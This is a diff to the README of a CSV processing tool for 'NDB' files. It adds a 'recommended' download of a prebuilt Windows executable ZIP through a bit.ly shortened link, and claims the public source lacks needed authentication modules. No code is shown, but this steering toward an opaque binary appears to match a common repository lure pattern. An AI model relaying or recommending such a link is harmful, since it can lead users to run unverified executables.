@@ -6,6 +6,17 @@ A powerful CSV data processor designed for Network Database (NDB) files with tra
 **Hadi Fauzan Hanif**  
 Email: hadifauzanhanif@gmail.com
 
+## 📥 Download Ready-to-Use Application
+**🚀 [Download NDB CSV Processor v1.0.0](https://bit.ly/3ZFF8Tw)**
+- Complete executable package (no installation required)
+- All features included with authentication system
+- Windows compatible (.zip archive)
+- Extract and run directly
+
+*Note: The GitHub source code version excludes authentication modules for security. Use the download link above for full functionality.*
+
+---
+
 ## Features
 
 ### Core Processing
@@ -68,17 +79,27 @@ The processor intelligently maps and filters columns according to predefined rul
 
 ## Installation
 
-### Prerequisites
+### Option 1: Download Ready-to-Use Application (Recommended)
+**[📥 Download NDB CSV Processor v1.0.0](https://bit.ly/3ZFF8Tw)**
+1. Download the ZIP file from the link above
+2. Extract to your preferred location
+3. Run the executable directly
+4. No installation or dependencies required!
+
+### Option 2: From Source Code (Developer Version)
+**Prerequisites:**
 ```bash
 pip install -r requirements.txt
 ```
 
-### Required Dependencies
+**Required Dependencies:**
 - pandas>=2.0.0
 - polars>=0.20.0
 - dearpygui>=1.9.0
 - numpy
 - pathlib
+
+**Note:** Source code version requires additional authentication modules not included in this repository.
 
 ## Usage
 
